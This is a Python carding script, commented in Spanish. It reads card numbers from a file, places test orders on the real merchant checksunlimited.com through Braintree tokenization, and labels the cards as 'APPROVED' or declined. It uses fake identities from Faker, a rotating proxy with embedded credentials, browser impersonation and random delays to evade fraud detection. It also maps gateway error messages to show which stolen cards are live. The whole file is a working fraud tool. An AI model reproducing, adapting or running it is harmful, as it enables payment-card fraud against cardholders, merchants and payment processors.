import time
import random
import re
import base64
import json
import uuid
import os
from curl_cffi import requests
from faker import Faker
from bs4 import BeautifulSoup

fake = Faker()

PRX = "http://bxgjlizg-rotate:mjzr41kvin2m@p.webshare.io:80"
proxies = {"http": PRX, "https": PRX}

def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except: return None

def process_card(cc_input):
    try:
        cc, mes, ano, cvv = cc_input.strip().split('|')
        if len(ano) == 2: ano = "20" + ano
        if len(mes) == 1: mes = "0" + mes
    except ValueError:
        return "RECHAZADO: Formato incorrecto"

    session = requests.Session(impersonate="chrome110")
    session.proxies = proxies
    
    # --- PASO 1: Agregar al carrito ---
    try:
        r_init = session.get('https://www.checksunlimited.com/p/2456/black-leather-debit-wallets/', timeout=20)
        
        if r_init.status_code != 200:
            return f"RECHAZADO: Error de conexión inicial ({r_init.status_code})"

        headers_add = {
            'Origin': 'https://www.checksunlimited.com',
            'Referer': 'https://www.checksunlimited.com/p/2456/black-leather-debit-wallets/',
        }
        data_add = {
            'VirtualProductId': '2456',
            'ProductId': '43846',
            'PhotoAllowed': 'False',
            'ProductCode': '945259',
            'Quantity': '1',
            'offerCode': '',
        }
        session.post('https://www.checksunlimited.com/product/accessoryproductsubmit/', headers=headers_add, data=data_add, timeout=20)
    except Exception as e: return f"RECHAZADO: Error P1 ({e})"

    time.sleep(random.uniform(2, 4))

    # --- PASO 2: Sacar __RequestVerificationToken dinámico ---
    try:
        r_cart = session.get('https://www.checksunlimited.com/cart/?dcf=a1', timeout=20)
        soup_cart = BeautifulSoup(r_cart.text, 'html.parser')
        rv_token = soup_cart.find('input', {'name': '__RequestVerificationToken'})['value']
        
        headers_cont = {
            'Origin': 'https://www.checksunlimited.com',
            'Referer': 'https://www.checksunlimited.com/cart/?dcf=a1',
        }
        session.post('https://www.checksunlimited.com/cart/continue/?dcf=a1', headers=headers_cont, data={'__RequestVerificationToken': rv_token}, timeout=20)
    except Exception as e: return f"RECHAZADO: Error P2 ({e})"

    time.sleep(random.uniform(2, 4))

    # --- PASO 3: Ir al checkout ---
    try:
        r_checkout = session.get('https://www.checksunlimited.com/checkout/?dcf=a1', timeout=25)
        
        # Extraer token de Braintree dinámicamente si es posible
        bt_auth = capture(r_checkout.text, 'authorization: \'', '\'') or capture(r_checkout.text, 'authorization: "', '"')
        if not bt_auth:
            bt_auth = "production_24ztb54j_5yyrcmzxrb5m4675" # Fallback
            
        soup_ch = BeautifulSoup(r_checkout.text, 'html.parser')
        rv_token_final = soup_ch.find('input', {'name': '__RequestVerificationToken'})['value']
    except Exception as e: return f"RECHAZADO: Error P3 ({e})"

    time.sleep(random.uniform(3, 5))

    # --- PASO 4: Tokenizar CC (Braintree GraphQL) ---
    try:
        bt_headers = {
            'authorization': f'Bearer {bt_auth}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
        }

        # Generar un Device Data (opcional pero ayuda a la simulación humana)
        device_data = base64.b64encode(json.dumps({
            "device_session_id": str(uuid.uuid4()).replace("-", ""),
            "fraud_merchant_id": "600000"
        }).encode()).decode() if 'base64' in globals() else str(uuid.uuid4())

        bt_json = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': '''
                mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { 
                    tokenizeCreditCard(input: $input) { 
                        token 
                    } 
                }''',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': None,
                        'billingAddress': {'postalCode': '10002'},
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        r_bt = session.post('https://payments.braintree-api.com/graphql', headers=bt_headers, json=bt_json, timeout=20)
        res_bt = r_bt.json()
        
        if 'errors' in res_bt:
            return f"RECHAZADO: {res_bt['errors'][0].get('message', 'Error en tokenización')}"
        
        nonce = res_bt['data']['tokenizeCreditCard']['token']
    except Exception as e: return f"RECHAZADO: Error P4 ({e})"

    time.sleep(random.uniform(2, 4))

    # --- PASO 5: Confirmar Pedido con datos aleatorios ---
    try:
        fname = fake.first_name()
        lname = fake.last_name()
        email = f"{fname.lower()}{lname.lower()}{random.randint(100,999)}@gmail.com"
        phone = f"({random.randint(200,999)}) {random.randint(200,999)}-{random.randint(1000,9999)}"
        street = fake.street_address()

        headers_final = {
            'X-Requested-With': 'XMLHttpRequest',
            '__RequestVerificationToken': rv_token_final,
            'Referer': 'https://www.checksunlimited.com/checkout/?dcf=a1',
            'Origin': 'https://www.checksunlimited.com',
        }
        
        data_final = {
            'ShipToAddressOnCheckPOBox': 'false',
            'ShippingAddress.IsPOBox': 'true',
            'DeliveryCode': 'STD',
            'SendEmailUpdates': 'true',
            'ShippingAddress.Organization': '',
            'ShippingAddress.FirstName': fname,
            'ShippingAddress.LastName': lname,
            'ShippingAddress.StreetAddress': street,
            'ShippingAddress.StreetAddress2': '',
            'ShippingAddress.City': 'New York',
            'ShippingAddress.State': 'NY',
            'ShippingAddress.Zip': '10002',
            'shipping-method': 'STD',
            'SecureOnlinePayment.Email': email,
            'SecureOnlinePayment.Phone': phone,
            'SecureOnlinePayment.Name': f"{fname} {lname}",
            'SecureOnlinePayment.BillingZipCode': '10002',
            'nonce': nonce,
            'isCreditCardPayment': 'true'
        }
        
        r_final = session.post('https://www.checksunlimited.com/checkout/api/placeorder/?channel=a1', 
                              headers=headers_final, data=data_final, timeout=40)
        
        try:
            res_json = r_final.json()
            if res_json.get('Success'):
                return "Status: APPROVED: Charged ✅"
            
            msg = res_json.get('Message') or res_json.get('Error') or "Transaction Declined"
            msg_lower = msg.lower()

            # Mapeo de respuestas para detectar hits (AVS/Funds/CVV)
            if any(x in msg_lower for x in ["insufficient funds", "funds", "2001"]):
                return "Status: APPROVED: Insufficient Funds ✅"
            
            if any(x in msg_lower for x in ["avs", "postal code", "zip", "billing address", "2008", "address does not match"]):
                return "Status: APPROVED: AVS/Zip ✅"
                
            if any(x in msg_lower for x in ["cvv", "security code", "2010", "gateway rejected: cvv"]):
                return "Status: APPROVED: CCN/CVC ✅"

            # Aprobación específica solicitada: Solo si es la frase completa
            if "transaction declined" in msg_lower:
                return f"Status: APPROVED: {msg} ✅"

            return f"Status: RECHAZADO: {msg}"
        except:
            # Si no es JSON, limpiar el HTML para ver el error
            clean_err = re.sub(r'<[^>]+>', '', r_final.text).strip()
            return f"Status: RECHAZADO: {clean_err[:150]}"

    except Exception as e: return f"RECHAZADO: Error P5 ({e})"

if __name__ == "__main__":
    file_path = 'card.txt'
    if not os.path.exists(file_path):
        print(f"❌ No se encontró {file_path}")
    else:
        while True:
            with open(file_path, 'r') as f:
                lines = f.readlines()
            if not lines:
                print("🏁 No hay más tarjetas.")
                break
            
            current_cc = lines[0].strip()
            if current_cc:
                print(f"🔄 Procesando: {current_cc}")
                print(process_card(current_cc))
            
            with open(file_path, 'w') as f:
                f.writelines(lines[1:])
            
            time.sleep(random.uniform(5, 12))
